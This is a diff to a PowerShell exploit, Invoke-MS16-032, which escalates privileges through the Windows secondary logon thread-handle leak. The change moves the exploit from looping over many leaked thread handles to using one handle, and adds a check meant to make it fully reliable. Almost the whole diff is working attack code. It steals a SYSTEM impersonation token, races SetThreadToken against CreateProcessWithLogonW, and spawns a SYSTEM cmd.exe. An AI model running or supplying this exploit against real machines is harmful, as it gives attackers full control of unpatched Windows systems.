@@ -15,8 +15,6 @@ function Invoke-MS16-032 {
     
     * In order for the race condition to succeed the machine must have 2+ CPU
       cores. If testing in a VM just make sure to add a core if needed mkay.
-    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded
-      but not spawn a shell. Not sure what the issue is but just re-run and profit!
     * Want to know more about MS16-032 ==>
       https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
 
@@ -209,20 +207,19 @@ function Invoke-MS16-032 {
 	}
 	
 	function Get-SystemToken {
-		echo "`n[?] Trying thread handle: $Thread"
-		echo "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName)"
+		echo "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($hThread))).ProcessName)"
 	
-		$CallResult = [Kernel32]::SuspendThread($Thread)
+		$CallResult = [Kernel32]::SuspendThread($hThread)
 		if ($CallResult -ne 0) {
-			echo "[!] $Thread is a bad thread, moving on.."
+			echo "[!] $hThread is a bad thread, exiting.."
 			Return
 		} echo "[+] Thread suspended"
 		
 		echo "[>] Wiping current impersonation token"
-		$CallResult = [Advapi32]::SetThreadToken([ref]$Thread, [IntPtr]::Zero)
+		$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, [IntPtr]::Zero)
 		if (!$CallResult) {
-			echo "[!] SetThreadToken failed, moving on.."
-			$CallResult = [Kernel32]::ResumeThread($Thread)
+			echo "[!] SetThreadToken failed, exiting.."
+			$CallResult = [Kernel32]::ResumeThread($hThread)
 			echo "[+] Thread resumed!"
 			Return
 		}
@@ -233,26 +230,29 @@ function Invoke-MS16-032 {
 		$SQOS.ImpersonationLevel = 2 #SecurityImpersonation
 		$SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS)
 		# Undocumented API's, I like your style Microsoft ;)
-		$CallResult = [Ntdll]::NtImpersonateThread($Thread, $Thread, [ref]$sqos)
+		$CallResult = [Ntdll]::NtImpersonateThread($hThread, $hThread, [ref]$sqos)
 		if ($CallResult -ne 0) {
-			echo "[!] NtImpersonateThread failed, moving on.."
-			$CallResult = [Kernel32]::ResumeThread($Thread)
+			echo "[!] NtImpersonateThread failed, exiting.."
+			$CallResult = [Kernel32]::ResumeThread($hThread)
 			echo "[+] Thread resumed!"
 			Return
 		}
+		
+		# Null $SysTokenHandle
+		$script:SysTokenHandle = [IntPtr]::Zero
 
 		# 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE
-		$CallResult = [Advapi32]::OpenThreadToken($Thread, 0x0006, $false, [ref]$SysTokenHandle)
+		$CallResult = [Advapi32]::OpenThreadToken($hThread, 0x0006, $false, [ref]$SysTokenHandle)
 		if (!$CallResult) {
-			echo "[!] OpenThreadToken failed, moving on.."
-			$CallResult = [Kernel32]::ResumeThread($Thread)
+			echo "[!] OpenThreadToken failed, exiting.."
+			$CallResult = [Kernel32]::ResumeThread($hThread)
 			echo "[+] Thread resumed!"
 			Return
 		}
 		
 		echo "[?] Success, open SYSTEM token handle: $SysTokenHandle"
 		echo "[+] Resuming thread.."
-		$CallResult = [Kernel32]::ResumeThread($Thread)
+		$CallResult = [Kernel32]::ResumeThread($hThread)
 	}
 	
 	# main() <--- ;)
@@ -274,106 +274,98 @@ function Invoke-MS16-032 {
 		Return
 	}
 	
-	# Create array for Threads & TID's
-	$ThreadArray = @()
-	$TidArray = @()
-	
-	echo "[>] Duplicating CreateProcessWithLogonW handles.."
+	echo "[>] Duplicating CreateProcessWithLogonW handle"
 	# Loop Get-ThreadHandle and collect thread handles with a valid TID
-	for ($i=0; $i -lt 500; $i++) {
-		$hThread = Get-ThreadHandle
-		$hThreadID = [Kernel32]::GetThreadId($hThread)
-		# Bit hacky/lazy, filters on uniq/valid TID's to create $ThreadArray
-		if ($TidArray -notcontains $hThreadID) {
-			$TidArray += $hThreadID
-			if ($hThread -ne 0) {
-				$ThreadArray += $hThread # This is what we need!
-			}
-		}
-	}
+	$hThread = Get-ThreadHandle
 	
-	if ($($ThreadArray.length) -eq 0) {
+	# If no thread handle is captured, the box is patched
+	if (!$hThread) {
 		echo "[!] No valid thread handles were captured, exiting!`n"
 		Return
 	} else {
-		echo "[?] Done, got $($ThreadArray.length) thread handle(s)!"
-		echo "`n[?] Thread handle list:"
-		$ThreadArray
+		echo "[?] Done, using thread handle: $hThread"
+	} echo "`n[*] Sniffing out privileged impersonation token.."
+	
+	# Get handle to SYSTEM access token
+	Get-SystemToken
+	
+	# If we fail a check in Get-SystemToken, skip loop
+	if ($SysTokenHandle -eq 0) {
+		Return
 	}
 	
-	echo "`n[*] Sniffing out privileged impersonation token.."
-	foreach ($Thread in $ThreadArray){
+	echo "`n[*] Sniffing out SYSTEM shell.."
+	echo "`n[>] Duplicating SYSTEM token"
+	$hDuplicateTokenHandle = [IntPtr]::Zero
+	$CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)
+	
+	# Simple PS runspace definition
+	echo "[>] Starting token race"
+	$Runspace = [runspacefactory]::CreateRunspace()
+	$StartTokenRace = [powershell]::Create()
+	$StartTokenRace.runspace = $Runspace
+	$Runspace.Open()
+	[void]$StartTokenRace.AddScript({
+		Param ($hThread, $hDuplicateTokenHandle)
+		while ($true) {
+			$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, $hDuplicateTokenHandle)
+		}
+	}).AddArgument($hThread).AddArgument($hDuplicateTokenHandle)
+	$AscObj = $StartTokenRace.BeginInvoke()
+	
+	echo "[>] Starting process race"
+	# Adding a timeout (10 seconds) here to safeguard from edge-cases
+	$SafeGuard = [diagnostics.stopwatch]::StartNew()
+	while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
+
+		# StartupInfo Struct
+		$StartupInfo = New-Object STARTUPINFO
+		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
 		
-		# Null $SysTokenHandle
-		$script:SysTokenHandle = [IntPtr]::Zero
+		# ProcessInfo Struct
+		$ProcessInfo = New-Object PROCESS_INFORMATION
 		
-		# Get handle to SYSTEM access token
-		Get-SystemToken
+		# CreateProcessWithLogonW --> lpCurrentDirectory
+		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
 		
-		# If we fail a check in Get-SystemToken, skip loop
-		if ($SysTokenHandle -eq 0) {
+		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
+		$CallResult = [Advapi32]::CreateProcessWithLogonW(
+			"user", "domain", "pass",
+			0x00000002, "C:\Windows\System32\cmd.exe", "",
+			0x00000004, $null, $GetCurrentPath,
+			[ref]$StartupInfo, [ref]$ProcessInfo)
+		
+		#---
+		# Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.
+		#---
+		# Missing this check used to cause the exploit to fail sometimes.
+		# If CreateProcessWithLogon fails OpenProcessToken won't succeed
+		# but we obviously don't have a SYSTEM shell :'( . Should be 100%
+		# reliable now!
+		#---
+		if (!$CallResult) {
 			continue
 		}
-		
-		echo "`n[*] Sniffing out SYSTEM shell.."
-		echo "`n[>] Duplicating SYSTEM token"
-		$hDuplicateTokenHandle = [IntPtr]::Zero
-		$CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)
-		
-		# Simple PS runspace definition
-		echo "[>] Starting token race"
-		$Runspace = [runspacefactory]::CreateRunspace()
-		$StartTokenRace = [powershell]::Create()
-		$StartTokenRace.runspace = $Runspace
-		$Runspace.Open()
-		[void]$StartTokenRace.AddScript({
-			Param ($Thread, $hDuplicateTokenHandle)
-			while ($true) {
-				$CallResult = [Advapi32]::SetThreadToken([ref]$Thread, $hDuplicateTokenHandle)
-			}
-		}).AddArgument($Thread).AddArgument($hDuplicateTokenHandle)
-		$AscObj = $StartTokenRace.BeginInvoke()
-		
-		echo "[>] Starting process race"
-		# Adding a timeout (10 seconds) here to safeguard from edge-cases
-		$SafeGuard = [diagnostics.stopwatch]::StartNew()
-		while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
-			# StartupInfo Struct
-			$StartupInfo = New-Object STARTUPINFO
-			$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
 			
-			# ProcessInfo Struct
-			$ProcessInfo = New-Object PROCESS_INFORMATION
-			
-			# CreateProcessWithLogonW --> lpCurrentDirectory
-			$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
-			
-			# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
-			$CallResult = [Advapi32]::CreateProcessWithLogonW(
-				"user", "domain", "pass",
-				0x00000002, "C:\Windows\System32\cmd.exe", "",
-				0x00000004, $null, $GetCurrentPath,
-				[ref]$StartupInfo, [ref]$ProcessInfo)
-				
-			$hTokenHandle = [IntPtr]::Zero
-			$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
-			# If we can't open the process token it's a SYSTEM shell!
-			if (!$CallResult) {
-				echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
-				$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
-				$StartTokenRace.Stop()
-				$SafeGuard.Stop()
-				Return
-			}
-				
-			# Clean up suspended process
-			$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
-			$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
-			$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
+		$hTokenHandle = [IntPtr]::Zero
+		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
+		# If we can't open the process token it's a SYSTEM shell!
+		if (!$CallResult) {
+			echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
+			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
+			$StartTokenRace.Stop()
+			$SafeGuard.Stop()
+			Return
 		}
-		
-		# Kill runspace & stopwatch if edge-case
-		$StartTokenRace.Stop()
-		$SafeGuard.Stop()
+			
+		# Clean up suspended process
+		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
+		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
+		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
+
 	}
+	
+	# Kill runspace & stopwatch if edge-case
+	$StartTokenRace.Stop()
+	$SafeGuard.Stop()
 }
